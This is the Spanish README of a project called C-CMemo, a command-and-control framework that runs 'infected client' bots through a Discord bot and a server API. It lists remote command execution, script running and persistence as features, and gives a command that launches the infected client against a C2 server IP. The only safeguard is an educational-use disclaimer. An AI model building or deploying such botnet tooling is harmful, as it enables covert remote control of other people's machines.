
# C-CMemo

C-CMemo es un framework de Comando y Control (C&C) para gestionar bots a través de un bot de Discord y una API de servidor. Este proyecto es solo para fines educativos y de investigación.

## Características

- Gestionar bots a través de un bot de Discord.
- Enviar comandos a los bots.
- Listar bots conectados.
- Cerrar conexiones con bots específicos.
- Ejecutar scripts de forma remota.
- Asegurar persistencia en los bots.

## Estructura del Proyecto

```
C-CMemo/
├── config/
│   ├── config.ini
│   ├── config_bot.ini
├── src/
│   ├── discord_bot.py
│   ├── servidor.py
│   ├── clienteinfectado.py
├── docs/
│   ├── eula_servidor.txt
│   ├── eula_cliente.txt
├── README.md
```

## Configuración

### config.ini

Este archivo contiene la configuración para el servidor.

```ini
[NETWORK]
HOST = 127.0.0.1
PORT = 5000
MAX_CONNECTIONS = 10

[DATABASE]
DB_PATH = bbdd/bots.db

[SECURITY]
SECRET_KEY = MiClaveSuperSecreta
HASH_ALGORITHM = SHA256

[LOGGING]
LOG_LEVEL = INFO
LOG_DIR = logs
CLIENT_LOG_FILE = client.log
SERVER_LOG_FILE = server.log
```

### config_bot.ini

Este archivo contiene la configuración para el bot de Discord.

```ini
[DISCORD]
BOT_TOKEN = TU_DISCORD_BOT_TOKEN
CONNECTIONS_CHANNEL_ID = TU_CONNECTIONS_CHANNEL_ID
COMMANDS_CHANNEL_ID = TU_COMMANDS_CHANNEL_ID
GENERIC_RESPONSES_CHANNEL_ID = TU_GENERIC_RESPONSES_CHANNEL_ID
SCRIPT_RESPONSES_CHANNEL_ID = TU_SCRIPT_RESPONSES_CHANNEL_ID
BOT_INFO_RESPONSES_CHANNEL_ID = TU_BOT_INFO_RESPONSES_CHANNEL_ID
```

## Uso

### 1. Configuración del Servidor

1. Instalar las dependencias necesarias:

   ```bash
   pip install -r requirements.txt
   ```
2. Configurar el archivo `config.ini` con tus ajustes deseados.
3. Ejecutar el servidor:

   ```bash
   python src/servidor.py
   ```

### 2. Configuración del Bot de Discord

1. Crear un bot de Discord y obtener el token del bot. Sigue las instrucciones [aquí](https://discordpy.readthedocs.io/en/stable/discord.html).
2. Configurar el archivo `config_bot.ini` con tu token de bot y los IDs de los canales.
3. Ejecutar el bot de Discord:

   ```bash
   python src/discord_bot.py
   ```

### 3. Configuración del Cliente Infectado

1. Configurar el archivo `config.ini` con la IP y el puerto del servidor.
2. Ejecutar el cliente infectado:

   ```bash
   python src/clienteinfectado.py --host <SERVER_IP> --port <SERVER_PORT> --key <SECRET_KEY>
   ```

## Comandos

### Comandos del Bot de Discord

- **!listar_bots**: Lista los bots conectados.
- **!enviar_comando <comando_windows> <comando_linux>**: Envía un comando a los bots conectados.
- **!cerrar_conexion <bot_id>**: Cierra la conexión con un bot específico.
- **!menu_comandos**: Muestra el menú de comandos.
- **!ayuda**: Muestra el mensaje de ayuda.

### Endpoints de la API del Servidor

- **GET /listar_bots**: Lista los bots conectados.
- **POST /enviar_comando**: Envía un comando a los bots seleccionados.
- **POST /cerrar_conexion**: Cierra la conexión con un bot específico.

## Licencia

Este proyecto es solo para fines educativos y de investigación. El uso de este software en redes no autorizadas está prohibido. El usuario debe cumplir con las leyes de su país. El autor no se hace responsable de cualquier uso indebido de este software.
